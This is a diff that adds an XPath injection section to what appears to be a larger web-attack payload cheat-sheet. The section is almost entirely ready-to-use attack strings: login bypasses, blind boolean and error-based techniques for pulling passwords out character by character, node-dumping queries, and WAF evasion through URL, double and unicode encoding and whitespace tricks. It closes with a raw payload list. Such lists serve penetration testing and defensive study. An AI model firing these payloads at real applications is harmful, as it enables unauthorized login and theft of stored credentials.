@@ -2839,7 +2839,115 @@ Insecure Direct Object References (IDOR) is a security vulnerability that occurs
 ' or ''=''
 x' or 1=1 or 'x'='y
 ```
+# 🔹 Basic XPath Injection Payloads
 
+* Simple boolean injection:    `' or '1'='1` → Always true condition.
+* Numeric bypass:    `1 or 1=1` → Bypasses numeric filters.
+* Closing quote injection:    `' or 'a'='a` → Breaks query logic.
+* AND logic test:    `' and '1'='1` → Validates injection point.
+* False condition test:    `' and '1'='2` → Used for boolean testing.
+
+# 🔹 Authentication Bypass Payloads
+
+* Login bypass (classic):    `' or '1'='1' or ''='` → Bypasses authentication check.
+* Username-independent login:    `' or '1'='1` → Ignores password validation.
+* Password bypass:    `' or password='admin` → Forces match.
+* Multiple OR conditions:    `' or 'a'='a' or 'b'='b` → More reliable bypass.
+* Null bypass:   `' or ''='` → Matches empty condition.
+
+# 🔹 XPath Syntax Manipulation
+
+* Close predicate:    `'] | //user | //'` → Breaks out of query path.
+* Inject new node:    `' or //user[role='admin'] or '` → Select admin node.
+* Axis injection:    `' or //node() or '` → Access all nodes.
+* Attribute selection:    `' or //@* or '` → Access all attributes.
+* Wildcard selection:    `' or //* or '` → Select entire XML.
+
+# 🔹 Data Extraction Payloads
+
+* Extract usernames:    `' or //user/username/text()='admin`
+* Extract all nodes:    `' or //*` → Dumps all XML nodes.
+* Extract attributes:    `' or //@*` → Lists attributes.
+* Target specific node:   `' or //password/text()='secret`
+* Combine nodes:    `' or //user/password/text()='admin`
+
+# 🔹 Blind XPath Injection (Boolean-Based)
+
+* True condition:  `' and string-length(//user[1]/password)=5` → Check length.
+* False condition:    `' and string-length(//user[1]/password)=10`
+* Character extraction:    `' and substring(//user[1]/password,1,1)='a'`
+* Binary search:   `' and substring(//user[1]/password,1,1)>'m'`
+* Incremental extraction:    `' and substring(//user[1]/password,2,1)='b'`
+
+# 🔹 Blind XPath Injection (Error-Based)
+
+* Force error:    `' or count(//*)=1 div 0` → Division error.
+* Type mismatch:    `' or string-length(//*)='a'` → Causes evaluation error.
+* Invalid function:    `' or unknown-function()`
+
+# 🔹 Advanced XPath Injection Payloads
+
+* Namespace bypass:    `' or //*`
+* Function abuse:    `' or contains(name(), 'user')`
+* Position-based extraction:    `' or //user[position()=1]`
+* Count-based logic:   `' or count(//user)=1`
+* Attribute filter:    `' or //user[@role='admin']`
+
+# 🔹 WAF Bypass Techniques (XPath Injection)
+
+## 🧩 Encoding Tricks
+
+* URL encoding:    `%27%20or%20%271%27=%271`
+* Double encoding:    `%2527%2520or%2520%25271%2527=%25271`
+* Unicode encoding:    `\u0027 or \u0031=\u0031`
+
+## 🧩 Case & Obfuscation
+
+* Case variation:   `' Or '1'='1`
+* Mixed spacing:    `'  or  '1'  =  '1`
+* Tab injection:    `' or%091=1`
+* Newline bypass:    `' or%0a1=1`
+
+## 🧩 Filter Bypass Tricks
+
+* Alternate operators:    `or 1=1`
+* Concatenation:    `' or concat('a','b')='ab'`
+* Function-based logic:    `' or boolean(1)`
+
+## 🧩 Special Character Bypass
+
+* Comment-style injection:    `' or '1'='1'--`
+* Breaking quotes:   `"' or "1"="1`
+* Mixed quotes:    `' or "a"="a`
+
+## 🧩 Structural Bypass
+
+* Break query structure:    `'] | //* | ['`
+* Inject new paths:    `' or //text()`
+* Use wildcard nodes:    `' or //*`
+
+```
+' or '1'='1
+' or 'a'='a
+' or 1=1
+1 or 1=1
+' and '1'='1
+' and '1'='2
+' or //*
+' or //@*
+' or //user
+' or //password
+' or //text()
+' and string-length(//user[1]/password)=1
+' and substring(//user[1]/password,1,1)='a'
+' and substring(//user[1]/password,1,1)='b'
+%27%20or%20%271%27=%271
+%27%20and%20%271%27=%272
+%2527%2520or%2520%25271%2527=%25271
+' or contains(//user,'admin')
+' or starts-with(//user,'a')
+' or count(//user)=1
+```
 ### Blind Exploitation:
 ```xpath
 and string-length(account)=SIZE_INT
